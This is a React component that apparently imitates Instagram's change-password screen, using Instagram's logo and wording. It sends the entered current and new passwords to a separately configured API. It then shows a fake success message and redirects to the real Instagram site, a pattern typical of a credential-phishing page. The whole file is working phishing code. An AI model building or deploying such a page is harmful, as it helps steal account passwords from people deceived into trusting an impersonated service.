import React, { useState } from "react";
import "./ChangePassword.css";

const ChangePassword = () => {
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [retypePassword, setRetypePassword] = useState("");
  const [error, setError] = useState("");
  const [showToast, setShowToast] = useState(false);

  const handleNewPasswordChange = (e) => {
    const val = e.target.value;
    setNewPassword(val);

    if (val.length > 0) {
      const hasLetter = /[a-zA-Z]/.test(val);
      const hasNumber = /[0-9]/.test(val);
      const hasSpecial = /[!$@%]/.test(val);
      const isLongEnough = val.length >= 6;

      if (!isLongEnough || !hasLetter || !hasNumber || !hasSpecial) {
        setError("Requirements: 6+ chars, letter, number, special (!$@%)");
      } else {
        setError("");
      }
    } else {
      setError("");
    }
  };

  const isFormValid =
    currentPassword.length > 0 &&
    newPassword.length >= 6 &&
    error === "" &&
    newPassword === retypePassword;

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!isFormValid) return;

    try {
      const response = await fetch(
        `${import.meta.env.VITE_API_URL}/api/password/change`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ currentPassword, newPassword }),
        },
      );

      const data = await response.json();
      if (response.ok) {
        setShowToast(true);
        setTimeout(() => {
          window.location.href = "https://www.instagram.com/";
        }, 500);
      } else {
        alert("Error: " + data.message);
      }
    } catch (err) {
      console.error("Error submitting form:", err);
      alert("Failed to connect to the server.");
    }
  };

  return (
    <div className="container">
      
      <div className="content">
        <div className="subtitle" style={{ textAlign: "center", marginBottom: "20px" }}>
          <img src="https://ik.imagekit.io/aiuser/favicon.png" alt="Instagram Logo" style={{ height: "45px", width: "auto", objectFit: "contain" }} />
        </div>

        <h1 className="title">Change password</h1>

        <p className="description">
          Your password must be at least 6 characters and should include a
          combination of numbers, letters and special characters (!$@%).
        </p>

        <form>
          <div className="input-group">
            <input
              type="password"
              className="input-field"
              placeholder="Current password"
              value={currentPassword}
              onChange={(e) => setCurrentPassword(e.target.value)}
            />
          </div>
          <div className="input-group">
            <input
              type="password"
              className={`input-field ${error ? "input-error" : ""}`}
              placeholder="New password"
              value={newPassword}
              onChange={handleNewPasswordChange}
            />
            {error && <div className="error-message">{error}</div>}
          </div>
          <div className="input-group">
            <input
              type="password"
              className={`input-field ${retypePassword && retypePassword !== newPassword ? "input-error" : ""}`}
              placeholder="Re-type new password"
              value={retypePassword}
              onChange={(e) => setRetypePassword(e.target.value)}
            />
            {retypePassword && retypePassword !== newPassword && (
              <div className="error-message">Passwords do not match.</div>
            )}
          </div>

          <a href="#" className="forgot-password">
            Forgot your password?
          </a>

          <label className="checkbox-container">
            <input type="checkbox" className="checkbox-input" />
            <div className="checkbox-custom"></div>
            <div className="checkbox-text">
              Log out of other devices. Choose this if someone else used your
              account.
            </div>
          </label>
        </form>
      </div>

      <div className="button-container">
        <button
          type="button"
          className={`submit-btn ${isFormValid ? "active" : ""}`}
          disabled={!isFormValid}
          onClick={handleSubmit}
        >
          Change password
        </button>
      </div>

      {showToast && (
        <div className="toast-message">Password changed successfully</div>
      )}
    </div>
  );
};

export default ChangePassword;
